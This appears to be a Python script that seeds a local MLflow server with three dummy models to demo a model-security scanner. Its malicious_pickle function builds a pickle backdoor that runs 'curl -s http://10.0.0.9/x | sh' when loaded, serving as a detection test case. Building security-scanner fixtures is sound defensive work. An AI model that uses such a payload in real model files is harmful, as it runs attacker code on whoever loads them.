#!/usr/bin/env python3
"""Seed a local MLflow server with models Assay can find something to say about.

Three registered models, chosen so the demo shows all three verdicts from one
source rather than a wall of green:

  sentiment-encoder  a clean safetensors file        -> Approved
  vision-captioner   an ordinary torch pickle        -> ReviewRequired (executable format)
  fraud-scoring      a pickle that runs a shell command on load -> Quarantined

Nothing here is a real model; the bytes are the smallest thing that trips each
code path in the inspector. Talks to the MLflow REST + artifact API directly so
it has no dependency on the mlflow client library.

    python3 hack/seed-mlflow.py http://localhost:5090
"""
import json
import os
import struct
import sys
import tempfile
import time
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5090").rstrip("/")


def api(path, payload):
    req = urllib.request.Request(
        f"{BASE}/api/2.0/mlflow/{path}",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as r:
        return json.load(r)


def upload(run_id, artifact_path, local_file):
    with open(local_file, "rb") as f:
        body = f.read()
    dest = f"{run_id}/artifacts/model/{artifact_path}"
    req = urllib.request.Request(
        f"{BASE}/api/2.0/mlflow-artifacts/artifacts/0/{dest}",
        data=body,
        headers={"Content-Type": "application/octet-stream"},
        method="PUT",
    )
    urllib.request.urlopen(req).read()


def clean_safetensors(path):
    tensors = {
        "encoder.weight": {"dtype": "F32", "shape": [64, 64], "data_offsets": [0, 16384]},
        "encoder.bias": {"dtype": "F32", "shape": [64], "data_offsets": [16384, 16640]},
    }
    hdr = json.dumps(tensors).encode()
    with open(path, "wb") as f:
        f.write(struct.pack("<Q", len(hdr)))
        f.write(hdr)
        f.write(b"\0" * 16640)


def benign_pickle(path):
    # A normal torch state-dict rebuild: GLOBAL torch._utils, no REDUCE against
    # an OS callable. Executable format, nothing malicious in it.
    data = (
        b"\x80\x04\x8c\x0ctorch._utils\x94\x8c\x13_rebuild_tensor_v2"
        b"\x94\x93\x94}\x94\x8c\x06layer0\x94K\x01s."
    )
    open(path, "wb").write(data)


def malicious_pickle(path):
    # proto 4, STACK_GLOBAL posix.system, REDUCE against a shell command. This
    # is the shape of a real pickle backdoor: code that runs the moment the
    # weights are loaded.
    data = (
        b"\x80\x04\x8c\x05posix\x94\x8c\x06system\x94\x93\x94"
        b"\x8c\x1ccurl -s http://10.0.0.9/x | sh\x94\x85\x94R\x94."
    )
    open(path, "wb").write(data)


MODELS = [
    ("sentiment-encoder", "model.safetensors", clean_safetensors),
    ("vision-captioner", "model.pkl", benign_pickle),
    ("fraud-scoring", "pytorch_model.bin", malicious_pickle),
]


def main():
    exp_id = "0"  # the Default experiment always exists under id 0
    tmp = tempfile.mkdtemp()

    for name, filename, build in MODELS:
        run = api("runs/create", {"experiment_id": exp_id, "start_time": int(time.time() * 1000)})
        run_id = run["run"]["info"]["run_id"]

        local = os.path.join(tmp, filename)
        build(local)
        upload(run_id, filename, local)

        mlmodel = os.path.join(tmp, "MLmodel")
        open(mlmodel, "w").write("flavors:\n  python_function:\n    loader_module: mlflow.pytorch\n")
        upload(run_id, "MLmodel", mlmodel)

        api("runs/update", {"run_id": run_id, "status": "FINISHED", "end_time": int(time.time() * 1000)})

        try:
            api("registered-models/create", {"name": name})
        except Exception:
            pass  # already registered from a previous run
        source = f"mlflow-artifacts:/0/{run_id}/artifacts/model"
        mv = api("model-versions/create", {"name": name, "source": source, "run_id": run_id})
        print(f"{name:20s} v{mv['model_version']['version']}  {source}")


if __name__ == "__main__":
    main()
